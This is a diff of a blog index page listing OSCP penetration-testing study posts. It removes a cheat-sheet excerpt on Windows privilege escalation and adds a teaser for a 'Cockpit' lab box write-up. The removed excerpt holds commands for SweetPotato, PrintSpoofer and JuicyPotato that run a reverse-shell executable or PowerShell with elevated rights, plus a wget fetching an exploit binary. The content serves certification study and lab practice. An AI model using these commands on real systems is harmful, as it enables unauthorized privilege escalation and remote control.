@@ -150,91 +150,6 @@
     
       <article class="post on-list">
         <h2 class="post-title">
-          <a href="/posts/oscp---cheat-sheet---active-directory/">OSCP - Cheat Sheet - Active Directory</a>
-        </h2>
-        <div class="post-meta"></div>
-
-        
-          <span class="post-tags">
-            
-            #<a href="/tags/cyber-security/">cyber-security</a>&nbsp;
-            
-            #<a href="/tags/oscp/">oscp</a>&nbsp;
-            
-          </span>
-        
-
-        
-
-
-        <div class="post-content">
-          
-            <p><a href="https://book.hacktricks.xyz/windows-hardening/active-directory-methodology">HackTricks - AD Methodology</a></p>
-<h1 id="initial-access">Initial Access</h1>
-<ul>
-<li><code>whoami</code>, <code>whoami /all</code></li>
-<li><code>whoami /priv</code>
-<ul>
-<li>SeImpersonatePrivilege
-<ul>
-<li>Run <a href="https://github.com/CCob/SweetPotato">SweetPotato</a>
-<ul>
-<li><code>./sweetpotato.exe -a &quot;C:\Users\Public\revshell.exe&quot;</code></li>
-</ul>
-</li>
-<li><a href="https://github.com/itm4n/FullPowers">FullPowers tool</a></li>
-<li><a href="https://jlajara.gitlab.io/Potatoes_Windows_Privesc">How to use potatoes</a> &amp; - <a href="https://ppn.snovvcrash.rocks/pentest/infrastructure/ad/privileges-abuse/seimpersonate/potatoes" title="Pre-compiled">Pre-compiled Potatoes</a></li>
-<li><a href="https://juggernaut-sec.com/seimpersonateprivilege/">How to use Juicy/Rogue Potato &amp; Printspoofer</a></li>
-<li><a href="https://github.com/itm4n/PrintSpoofer">Printspoofer - GitHub</a> <code>.\PrintSpoofer64.exe -i -c powershell.exe</code> <code>whoami</code></li>
-<li><a href="https://github.com/k4sth4/Juicy-Potato/tree/main">Juicy Potato - Github</a> <code>.\juicypotato.exe -l  -p c:\Users\tony\revshell.exe -t * -c &quot;{9E175B9C-F52A-11D8-B9A5-505054503030}&quot;</code></li>
-</ul>
-</li>
-<li>SEbackupPriv
-<ul>
-<li><a href="https://exploit-notes.hdks.org/exploit/windows/privilege-escalation/windows-privesc-with-sebackupprivilege/">https://exploit-notes.hdks.org/exploit/windows/privilege-escalation/windows-privesc-with-sebackupprivilege/</a></li>
-<li><a href="https://github.com/nickvourd/Windows-Local-Privilege-Escalation-Cookbook/blob/master/Notes/SeBackupPrivilege.md">https://github.com/nickvourd/Windows-Local-Privilege-Escalation-Cookbook/blob/master/Notes/SeBackupPrivilege.md</a></li>
-</ul>
-</li>
-<li>SeShutdownPrivilege
-<ul>
-<li>Can a startup process be modified? Then modify &amp; reboot</li>
-<li>Check service has <code>Auto</code>: `Get-CimInstance -ClassName win32_service | Select Name, StartMode | Where-Object {$_.Name -like &lsquo;httpd&rsquo;}</li>
-<li>Reboot: <code>shutdown /r /t 0</code></li>
-</ul>
-</li>
-<li><a href="https://github.com/xct/SeManageVolumeAbuse">SeManageVolumePrivilege</a>
-<ul>
-<li><code>wget https://github.com/CsEnox/SeManageVolumeExploit/releases/download/public/SeManageVolumeExploit.exe</code></li>
-<li></li>
-</ul>
-</li>
-</ul>
-</li>
-<li><code>whoami /groups</code>,
-<ul>
-<li><code>net localgroup</code> or <code>Get-LocalGroup</code> (Existing groups)</li>
-<li><code>Get-LocalGroupMember groupname</code> (Inspect)</li>
-</ul>
-</li>
-<li><code>systeminfo</code> (wiki build number)
-<ul>
-<li>Windows kernel exploits</li>
-</ul>
-</li>
-</ul>
-<p>More Initial Access</p>
-          
-        </div>
-
-        
-           <div>
-            <a class="read-more button inline" href="/posts/oscp---cheat-sheet---active-directory/">[Read more]</a>
-          </div>
-        
-      </article>
-    
-      <article class="post on-list">
-        <h2 class="post-title">
           <a href="/posts/oscp---cheat-sheet---core/">OSCP - Cheat Sheet - Core</a>
         </h2>
         <div class="post-meta"></div>
@@ -529,6 +444,38 @@ Launch Python Virtual Environment:</p>
         
            <div>
             <a class="read-more button inline" href="/posts/oscp---clue---linux/">[Read more]</a>
+          </div>
+        
+      </article>
+    
+      <article class="post on-list">
+        <h2 class="post-title">
+          <a href="/posts/oscp---cockpit---linux/">OSCP - Cockpit - Linux</a>
+        </h2>
+        <div class="post-meta"></div>
+
+        
+          <span class="post-tags">
+            
+            #<a href="/tags/cyber-security/">cyber-security</a>&nbsp;
+            
+          </span>
+        
+
+        
+
+
+        <div class="post-content">
+          
+            <h1 id="cockpit">Cockpit</h1>
+<p>This one was originally listed as &ldquo;Hard&rdquo; in my list, but when I checked during startup it showed as &ldquo;Intermediate&rdquo;. Definitely don&rsquo;t think it should be listed as &ldquo;Intermediate&rdquo; though - this was definitely the trickest boxes I&rsquo;ve done, and I absolutely leaned heavily on the walkthrough to make progress here.</p>
+<p>The biggest challenge ofcourse was the box breaking everytime I tried to run <code>gobuster</code> against it to find directories or files. Turned out there was a hidden <code>login.php</code> file on the port <code>80</code> server, but I couldn&rsquo;t find the damn thing with the first few gobuster scans because the whole box would break and require revert. Worse was finding the <code>blocked.html</code> page which would break the box every time I visited it OR scanned it with <code>gobuster</code>.</p>
+          
+        </div>
+
+        
+           <div>
+            <a class="read-more button inline" href="/posts/oscp---cockpit---linux/">[Read more]</a>
           </div>
         
       </article>
